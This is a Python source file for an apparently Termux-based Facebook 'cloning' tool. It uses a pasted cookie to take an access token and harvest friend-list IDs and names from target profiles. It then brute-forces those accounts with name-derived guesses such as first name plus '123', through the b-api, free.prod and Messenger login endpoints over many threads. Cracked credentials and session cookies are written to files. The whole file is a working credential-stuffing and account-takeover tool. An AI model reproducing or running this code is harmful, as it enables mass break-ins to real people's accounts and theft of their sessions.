###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64
from time import time as tod
from time import sleep
from concurrent.futures import ThreadPoolExecutor as YounisXyz
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ APPEN AND MORE ]-----###
id,uid,total_ids,id3,id4,id5,id6=[],[],[],[],[],[],[]
loop,ok,cp,a2f=0,0,0,0
method=[]
xyzxd, younis_xyz = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
rr = random.randint
rc = random.choice


###-----[ LOGO BANNER ]-----###
#--------------------------(MAIN LOGO)--------------------------#
logo=(f"""\033[1;97m   [ version "1.0 ]

     Y88b   d88P Y88b   d88P 8888888888P 
      Y88b d88P   Y88b d88P        d88P  
       Y88o88P     Y88o88P        d88P   
        \033[1;92mY888P       Y888P        d88P
        d888b        888        d88P\033[1;97m
       d88888b       888       d88P      
      d88P Y88b      888      d88P       
     d88P   Y88b     888     d8888888888 \033[0;97m
     
{45 * '━'}
 Author  : Muhammad Younis
 About   : http://younisxyz.bio.link
{45 * '━'}""" )

#--------------------------(CLEAR SCREEN)--------------------------#
def clear_terminal():
        os.system('clear')
        print(logo)
        
  
#--------------------------(LINE)--------------------------#     
def linex():
        print(f'\033[0;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        
        
        
###-----[ LOGIN COOKIES V1 ]-----###
ses = requests.Session()
def XYZ():
	clear_terminal()
	print(f" [1] Login Cookies") 
	print(f" [2] Crack From File No login") 
	linex()
	menu = input(f"Select option : ")
	if menu in ["01","1"]:
		login()
	elif menu in ["02","2"]:
		Crack_file()
	elif menu in ["03","3"]:
		Result()
	else:
		print(f"\n\033[1;91m Select Valid Option ...")
		time.sleep(2)
		XYZ()
		
###-----[ LOGIN COOKIES ]-----###
def login():
	clear_terminal();print(f'\033[0;97m Never use your personal account cookie     Recommended to use new account cookie');linex()
	cok = input(f' Put Facebook Cookie : ');linex()
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'\033[1;91m Cookie Invalid! ');time.sleep(2);login()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('/sdcard/XYZ/login_data/.tok.txt', 'a').write(took);open('/sdcard/XYZ/login_data/.cok.txt', 'a').write(cok)
				print(f"         [ Logged in successfully !  ] ") 
				print(f"\033[0;97m Access Token : {took}");time.sleep(3)
				menu()
	except Exception as e:exit(e)
	
	
###-----[ MENU SCRIPT ]-----###
def menu():
	clear_terminal()
	try:
		token = open('/sdcard/XYZ/login_data/.tok.txt','r').read()
		cok = open('/sdcard/XYZ/login_data/.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\033[1;91m  Login Cookies Not Found, \033[1;97mLogin First ....')
		time.sleep(2);os.system('clear')
		XYZ()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		name = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n\033[1;91m Internet Connection Error! ")
	except KeyError:
		try:os.remove("/sdcard/XYZ/login_data/.cok.txt");os.remove("/sdcard/XYZ/login_data/.tok.txt")
		except:pass
		print(f"\n\033[1;91m Login Cookie Is On Checkpoint...");time.sleep(2)
		clear_terminal()
	print(f" User ID : {uidfb} ") 
	print(f" User Name : {name} ") 
	linex()
	print(f" [1] Crack Public ID") 
	print(f" [2] Crack From File") 
	print(f" [0] Logout, Delete Cookie")
	linex()
	menu = input(f'Select option : ')
	if menu in ["01","1"]:
		clear_terminal()
		print(f'\033[0;97m Note Input Id Friendlist Public')
		idt = input(' ID Target : ')
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif menu in ["02","2"]:
		Crack_file()
	elif menu in ["03","3"]:
		nge_crack()
	elif menu in ['00','0']:
		os.system('rm -rf /sdcard/XYZ/login_data/.tok.txt')
		os.system('rm -rf /sdcard/XYZ/login_data/.cok.txt')
		print(f'\n\033[1;90m Success Logout, Delete Login Data! ')
		exit()
	else:
		print(f"\n\033[1;91m Select Valid Option ...")
		time.sleep(3)
		menu()

###-----[ DUMP OTOMATIS ]-----###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"}
		if len(id) == 0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r\033[0;100m Please wait, fetching ids {len(id)} \x1b[0m"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

###-----[ DUMP PUBLIK MASSAL ]-----###
def nge_crack():    
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'[•] MAU BERAPA ID : '))
	#	print(f'{P}[•• ────────────────────────────────────────── ••]')
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'[•] MASUKAN ID YANG KE  '+str(bilangan)+f' : ')
		uid.append(Masukan)
		#print(f'{P}[•• ────────────────────────────────────────── ••]')
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print('[∆] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : '+str(len(id))) 
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()
###-----[ CRACK FILE ]-----###
def Crack_file():
	clear_terminal()
	print(f"\033[1;96m For Example: /sdcard/xyz.txt")
	linex()
	file = input(f" Put File Path : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,name = data.split('|')
			except:continue
			sys.stdout.write(f"\r\033[0;100m Please wait, fetching ids {len(id)} \x1b[0m"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:print(f"\033[1;91m File Location Not Found! ");time.sleep(2);clear_terminal();print(f"\033[1;91m Try Again .... ");time.sleep(2);Crack_file()
	setting()
	
	
	
###-----[ SETTING URUTAN & METODE ]-----###


def setting():
	clear_terminal()
	print(f" [1] Crack Old IDs") 
	print(f" [2] Crack New IDs") 
	print(f" [3] Crack Mix IDs") 
	linex()
	menu = input(f' Select option : ')
	print("")
	if menu in ['1','01','old']:
		for old in sorted(id):
			total_ids.append(old)
	elif menu in ['2','02','new']:
		young=[]
		for new in sorted(id):
			young.append(new)
		jjj=len(young)
		abc=(jjj-1)
		for xmud in range(jjj):
			total_ids.append(young[abc])
			abc -=1
	elif menu in ['3','03','random']:
		for mix in id:
			xx = random.randint(0,len(total_ids))
			total_ids.insert(xx,mix)
	else:
		for mix in id:
			xx = random.randint(0,len(total_ids))
			total_ids.insert(xx,mix)
	clear_terminal()
	print(f" [1] Method \033[1;92mb-api.facebook.com\033[0;97m") 
	print(f" [2] Method \033[1;92mfree.prod.facebook.com\033[0;97m") 
	print(f" [3] Method \033[1;92mwww.messenger.com\033[0;97m") 
	linex()
	login_metode = input(f'Select Method Login : ')
	if login_metode in ["1","01"]:
		method.append('Api')
	elif login_metode in ["2","02"]:
		method.append('Validate')
	elif login_metode in ["3","03"]:
		method.append('Messenger')
	else:
		method.append('Api')
	clear_terminal()
	print(f" [1] Auto Password ") 
	print(f" [2] Add Password ") 
	print(f" [3] Choice Password ") 
	linex()
	password_metode = input(f'Select option : ')
	if password_metode in ['1','01']:
		Auto_Password()
	elif password_metode in ['2','02']:
		Add_Password()
	elif password_metode in ['3','03']:
		Manual()
	else:
		Auto_Password()
###-----[ SETTING PASSWORD OTOMATIS ]-----###
def Auto_Password():
	ua = input(f'\nDo You Want Yo Use A Manual User Agent? y/n : ')
	if ua in ['y','Ya','ya','Y']:
		younis_xyz.append('xyzxd');bz = input(f' Enter your manual user agent : ');xyzxd.append(bz)
	if ua in ['N','n','']:
		print(f"\033[1;90m You use the script's default user agent. ")
	else:younis_xyz.append('uasc')
	clear_terminal()
	print(f' Total lds : %s ' % len(total_ids))
	print('\033[0;97m Cloning Is Started Wait For Results')
	print(' After Every 5 Min Turn Airplane On/Off')
	linex()
	with YounisXyz(max_workers=10) as XYZ:
		for user in total_ids:
			uid,name = user.split('|')[0],user.split('|')[1].lower()
			first = name.split(" ")[0]
			pasw = []
			try:
				if len(name)<6:
					if len(first)<3:pass
					else:
						pasw.append(name)
						pasw.append(first+"12")
						pasw.append(first+"123")
						pasw.append(first+"1122")
						pasw.append(first+"1234")
						pasw.append(first+"12345")
				else:
					if len(first)<3:
						pasw.append(name)
						pasw.append(first+"12")
						pasw.append(first+"123")
						pasw.append(first+"1122")
						pasw.append(first+"1234")
						pasw.append(first+"12345")
					else:
						pasw.append(name)
						pasw.append(first+"12")
						pasw.append(first+"123")
						pasw.append(first+"1122")
						pasw.append(first+"1234")
						pasw.append(first+"12345")
				if 'Api' in method:
					XYZ.submit(bapi_facebook,uid,pasw)
				elif 'Validate' in method:
					XYZ.submit(free_facebook,uid,pasw)
				elif 'Messenger' in method:
					XYZ.submit(_messenger_,uid,pasw)
				else:
					XYZ.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	print("\033[0;97m")
	print(f" Crack Success {len(total_ids)} Ids") 
	print(f" Total OK/CP : {ok}/{cp}") 
	linex()
	input(' PRESS ENTER TO BACK ')
	menu()
	
	
###-----[ SETTING PASSWORD GABUNG ]-----###
def Add_Password():
	pw_manual=input(f'\n Enter Password Combined : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'\nDo You Want Yo Use A Manual User Agent? y/n : ')
	if ua in ['y','Ya','ya','Y']:
		younis_xyz.append('xyzxd');bz = input(f' Enter your manual user agent : ');xyzxd.append(bz)
	if ua in ['N','n','']:
		print(f"\033[1;90m You use the script's default user agent. ")
	else:younis_xyz.append('uasc')
	clear_terminal()
	print(f' Total lds : %s ' % len(total_ids))
	print('\033[0;97m Cloning Is Started Wait For Results')
	print(' After Every 5 Min Turn Airplane On/Off')
	linex()
	with YounisXyz(max_workers=35) as XYZ:
		for user in total_ids:
			uid,name = user.split('|')[0],user.split('|')[1].lower()
			first = name.split(" ")[0]
			pasw = []
			try:
				if len(name)<6:
					if len(first)<3:pass
					else:
						pasw.append(name)
						pasw.append(first+"12")
						pasw.append(first+"123")
						pasw.append(first+"1122")
						pasw.append(first+"1234")
						pasw.append(first+"12345")
						pasw.append(first+"321")
				else:
					if len(first)<3:
						pasw.append(name)
					else:
						pasw.append(name)
						pasw.append(first+"12")
						pasw.append(first+"123")
						pasw.append(first+"1122")
						pasw.append(first+"1234")
						pasw.append(first+"12345")
						pasw.append(first+"321")
				for xpwd in pwnya:
					pasw.append(xpwd)
				if 'Api' in method:
					XYZ.submit(bapi_facebook,uid,pasw)
				elif 'Validate' in method:
					XYZ.submit(free_facebook,uid,pasw)
				elif 'Messenger' in method:
					XYZ.submit(_messenger_,uid,pasw)
				else:
					XYZ.submit(_messenger_,uid,pasw)
			except:pass
	print("\r")
	print("\033[0;97m")
	print(f" Crack Success {len(total_ids)} Ids") 
	print(f" Total OK/CP : {ok}/{cp}") 
	linex()
	input(' PRESS ENTER TO BACK ')
	menu()
###-----[ SETTING PASSWORD MANUAL ]-----###


def Manual():
	pw_manual=input(f'\n Enter Password Manual : ')
	password_manual=pw_manual.split(',')
	for xpw in password_manual:
		pwnya.append(xpw)
	ua = input(f'\nDo You Want Yo Use A Manual User Agent? y/n : ')
	if ua in ['y','Ya','ya','Y']:
		younis_xyz.append('xyzxd');bz = input(f' Enter your manual user agent : ');xyzxd.append(bz)
	if ua in ['N','n','']:
		print(f"\033[1;90m You use the script's default user agent. ")
	else:younis_xyz.append('uasc')
	clear_terminal()
	print(f' Total lds : %s ' % len(total_ids))
	print('\033[0;97m Cloning Is Started Wait For Results')
	print(' After Every 5 Min Turn Airplane On/Off')
	linex()
	with YounisXyz(max_workers=30) as XYZ:
		for user in total_ids:
			uid,name = user.split('|')[0],user.split('|')[1].lower()
			first = name.split(" ")
			pasw = []
			for xpwd in pwnya:
				pasw.append(xpwd)
			if 'Api' in method:
				XYZ.submit(bapi_facebook,uid,pasw)
			elif 'Validate' in method:
				XYZ.submit(free_facebook,uid,pasw)
			elif 'Messenger' in method:
				XYZ.submit(_messenger_,uid,pasw)
			else:
				XYZ.submit(_messenger_,uid,pasw)
	print("\r")
	print("\033[0;97m")
	print(f" Crack Success {len(total_ids)} Ids") 
	print(f" Total OK/CP : {ok}/{cp}") 
	linex()
	input(' PRESS ENTER TO BACK ')
	menu()
	
	
###-----[ USERAGENT MENU ]-----###
useragent = []
useragent2 = []
def api():
	rr = random.randint
	rc = random.choice
	return f"Dalvik/2.1.0 (Linux; U; Android 13; RMX3760 Build/TP1A.220624.014) [FBAN/FB4A;FBAV/{str(rr(350,450))}.0.0.44.117;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/{str(rr(410000000,599999999))};FBCR/Smartfren 100% untuk Indonesia;FBMF/realme;FBBD/realme;FBDV/RMX3760;FBSV/{str(rr(10,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1440};FB_FW/1;FBRV/0;] FBBK/1"


def ugen():
  rr = random.randint
  rc = random.choice
  android_version = random.choice(["15_4","14_3","13_5","14_5","13_4"])
  xyz = random.choice(["Y6MLQN","8G7LN3","2783VM","X35XFL","W5T30Y"])
  younisxyz = f"Mozilla/5.0 (iPhone; CPU iPhone OS {android_version} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{xyz} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
  return rc([younisxyz])
  

###-----[ METODE VALIDATE ]-----###
def free_facebook(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\033[0;97m[XYZ-M2] {str(loop)} / [OK-{ok}] \r"),sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'xyzxd' in younis_xyz: ua = xyzxd[0]
			else:ua = ugen()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			hd = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r\033[1;92m[XYZ-OK] {uid} | {pw} ")
				print(f"\r\033[0;97m{kuki}")
				open('/sdcard/XYZ/ok.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f"\r\033[1;91m[XYZ-CP] {uid} | {pw} ")
				open('/sdcard/XYZ/cp.txt','a').write(uid+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1

###-----[ METODE API ]-----###
def bapi_facebook(uid,pasw):
	global loop,ok,cp,a2f
	sys.stdout.write(f"\033[0;97m[XYZ-M1] {str(loop)} / [OK-{ok}] \r"),sys.stdout.flush()
	ses = requests.Session()
	for pw in pasw:
		try:
			if 'xyzxd' in younis_xyz: ua = xyzxd[0]
			else:ua = api()
			headers_ = {"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)), "x-fb-sim-hni": str(rr(20000, 40000)), "x-fb-net-hni": str(rr(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': str(rr(2,31)), 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			response = ses.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers_)
			xxx = json.loads(response.text)
			if 'access_token' in response.text and 'EAAA' in response.text:
				ok+=1
				coki = xxx["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				print(f"\r\033[1;92m[XYZ-OK] {uid} | {pw} ")
				print(f"\r\033[0;97m{kuki}")
				open('/sdcard/XYZ/ok.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif 'www.facebook.com' in response.json()['error_msg']:
				cp+=1
				print(f"\r\033[1;91m[XYZ-CP] {uid} | {pw} ")
				open('/sdcard/XYZ/cp.txt','a').write(uid+'|'+pw+'\n')
				break
			elif 'Login approvals' in response.json()['error_msg']:
				a2f+=1
				print(f"\r\033[9;36m[XYZ-2F] {uid} | {pw}")
				open('/sdcard/XYZ/f2.txt','a').write(uid+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
###-----[ METODE MESSENGER 3]-----###
def _messenger_(uid,pasw):
	global loop,ok,cp
	sys.stdout.write(f"\033[0;97m[XYZ-M3] {str(loop)} / [OK-{ok}] \r"),sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			if 'xyzxd' in younis_xyz: ua = xyzxd[0]
			else:ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
			headers = {
             "Host": "www.messenger.com",
             "Connection": "keep-alive",
             "Content-Length": "267",
             "Cache-Control": "max-age=0",
             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Linux"',
             "Upgrade-Insecure-Requests": "1",
             "Origin": "https://www.messenger.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": ua,
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "Sec-Fetch-Site": "same-origin",
             "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-User": "?1",
             "Sec-Fetch-Dest": "document",
             "Referer": "https://www.messenger.com/",
             "Accept-Encoding": "gzip, deflate, br",
             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
			}
			reqs = ses.get("https://www.messenger.com/").text
			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
			data = {
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
             "timezone":"-420",
             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
             "lgnjs":"n",
             "email":uid,
             "pass":"Sungkem Puh Sepuhh",
             "login":"1",
             "persistent":"1",
             "default_persistent":""
			}
			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
			break
		except:pass
	for pw in pasw:
		try:
			data.update({"pass":"".join(pw)})
			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
				print(f"\r\033[1;92m[XYZ-OK] {uid} | {pw} ")
				print(f"\r\033[0;97m{kuki}")
				ok +=1
				open('/sdcard/XYZ/ok.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
				print(f"\r\033[1;91m[XYZ-CP] {uid} | {pw} ")
				open('/sdcard/XYZ/cp.txt','a').write(uid+'|'+pw+'\n')
				cp+=1
				break
			else:continue
		except (requests.exceptions.ConnectionError):
			time.sleep(15)
		except:pass
	loop+=1
        
if __name__=='__main__':
	try:os.mkdir('/sdcard/XYZ')
	except:pass
	try:os.mkdir('/sdcard/XYZ/login_data')
	except:pass
	menu()